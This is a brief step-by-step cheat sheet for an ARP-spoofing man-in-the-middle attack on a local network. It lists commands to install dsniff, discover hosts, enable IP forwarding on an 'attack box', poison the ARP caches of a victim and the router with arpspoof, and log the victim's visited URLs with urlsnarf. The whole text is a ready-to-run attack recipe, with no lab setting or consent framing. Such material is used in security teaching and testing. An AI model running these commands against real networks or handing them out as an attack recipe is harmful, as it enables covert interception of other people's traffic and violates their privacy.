Install dsniff

* `sudo -i`

* `apt-get update`

* `apt-get install dsniff`

Discover endpoints on local network

* `sudo netdiscover`

Enable port forwarding on attack box

* `echo 1 > /proc/sys/net/ipv4/ip_forward`

Generate fake ARP replies

* `sudo arpspoof -i eth0 -t <VICTIM_IP> <ROUTER_IP>`

Generate fake ARP to trick the router into believing that you are the victim. This allows you to intercept incoming internet traffic.

* `sudo arpspoof -i eth0 -t <ROUTER_IP> <VICTIM_IP>`

Extract websites that the victim visits

* `urlsnarf -i eth0`
